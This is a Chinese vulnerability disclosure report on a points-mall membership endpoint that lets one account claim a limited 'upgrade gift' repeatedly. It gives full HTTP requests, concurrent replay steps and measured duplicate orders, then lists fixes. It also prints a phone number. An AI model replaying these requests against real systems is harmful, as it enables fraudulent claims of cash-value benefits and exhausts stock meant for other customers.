# 积分商城V+会员系统存在权益重复领取漏洞

**漏洞名称：** 积分商城V+会员系统存在权益重复领取漏洞

**漏洞等级：** 高危

**漏洞类型：** 业务逻辑 / 限领次数与幂等控制缺失

**漏洞URL：**

`https://ttt.ebanktest.com.cn:18234/emallapp/zoneActivity/genZoneActivityOrder`

## 详细描述

V+会员“升级礼”发放接口在等级校验通过后，没有校验活动配置中的每人限领次数 `limit`，也没有幂等或去重控制。

同一账号对 `limit=1` 的同一活动商品重复提交，服务端每次返回成功并生成新的权益订单。实测同一商品落成 4 笔真实订单，活动库存从 99 扣到 95；另一个商品被重复领取 7 次，库存扣到 92。该接口也用于发放微信立减金等有现金价值的权益。

## 复现步骤

前置条件：一个符合活动等级要求的普通会员账号，且该账号已登录，持有有效 `SESSION`。

### 第 1 步：读取活动商品基线

完整请求包：

```http
POST /emallapp/zoneActivity/queryZoneActGoodsInfo HTTP/1.1
Host: ttt.ebanktest.com.cn:18234
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/x-www-form-urlencoded;charset=utf-8
X-Requested-With: XMLHttpRequest
Origin: https://ttt.ebanktest.com.cn:18234
Referer: https://ttt.ebanktest.com.cn:18234/html/10124/view/levelValue/physicalRewardSubmit.html
Cookie: SESSION=<普通会员会话>
Content-Length: 46
Connection: close

actId=322&zgId=1711&bankcode=10124&channel=007
```

响应中可以看到：

```json
{"limit":"1","custReceiveCount":"0","stockNum":"99","zoneGoods":{"pointPrice":"0","moneyPrice":"0.00"}}
```

`limit=1` 表示活动规则限定每人只能领取一次，当前账号还未领取，库存为 99。

### 第 2 步：提交一次领取请求

完整请求包：

```http
POST /emallapp/zoneActivity/genZoneActivityOrder HTTP/1.1
Host: ttt.ebanktest.com.cn:18234
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/x-www-form-urlencoded;charset=utf-8
X-Requested-With: XMLHttpRequest
Origin: https://ttt.ebanktest.com.cn:18234
Referer: https://ttt.ebanktest.com.cn:18234/html/10124/view/levelValue/physicalRewardSubmit.html
Cookie: SESSION=<普通会员会话>
Content-Length: 142
Connection: close

isUpGrade=&zgId=1711&telePhone=18766337856&storeId=&goodsId=5540062317509004359840&usualAddressno=1315599&actId=322&bankcode=10124&channel=007
```

响应包：

```json
{"retshow":"交易成功","msgKey":"<服务端每次生成的新 msgKey>","retcode":"0000"}
```

### 第 3 步：重复提交同一商品

保持同一个 `SESSION`，对同一 `actId=322&zgId=1711` 继续提交第 2 步请求，或使用 4 路并发同时提交。

实测结果：

```text
4 路并发请求全部返回 retcode=0000 交易成功
custReceiveCount 从 0 增加到 2
stockNum 从 99 扣到 97
同一商品生成 3 笔真实权益订单
继续串行提交后，custReceiveCount 增加到 4，库存扣到 95，订单累计 5 笔
```

另一个 `zgId=1709` 的 `limit=1` 商品，重复提交后 `custReceiveCount` 达到 7，库存从 99 扣到 92，说明限领校验在两个商品上都没有生效。

## 影响范围

同一账号可以重复领取升级礼、微信立减金等权益，造成营销资金损失，并把活动库存提前耗尽，导致正常客户无法领取。

## 修复方案

1. 服务端以 `账号 + actId + zgId` 为唯一约束，领取前在事务内检查 `custReceiveCount < limit`。
2. 对计次、扣库存和建单加行锁或分布式锁，避免并发请求同时通过校验。
3. 增加领取幂等键和频率限制，重复请求直接返回“已领取”，不能再次生成权益订单。
